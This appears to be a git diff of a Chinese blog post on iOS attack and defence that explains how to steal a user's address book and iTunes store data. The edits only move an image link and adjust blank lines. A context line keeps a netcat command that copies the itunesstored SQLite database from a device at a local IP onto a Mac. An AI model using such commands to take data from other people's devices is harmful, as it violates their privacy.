@@ -1,6 +1,7 @@
 title: iOS攻防——（二）如何窃取用户的通讯录信息
 date: 2016-07-12 21:31:24
 tags:
+
   - iOS
   - iOS攻防
 categories:
@@ -20,7 +21,7 @@ categories:
 ## 1. 需要一个plist
 需要这样一个plist，它看起来是这样：
 
-![](http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png)
+![](https://raw.githubusercontent.com/summertian4/Images/master/blog/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A6%82%E4%BD%95%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E7%9A%84iTunesstore%E4%BF%A1%E6%81%AF-01.png)
 
 <!--more-->
 
@@ -153,7 +154,6 @@ nc 192.168.31.152 55 > itunesstored2.sqlitedb
 ```
 
 OK，在MAC查看一下内容。
-
 
 ----
 
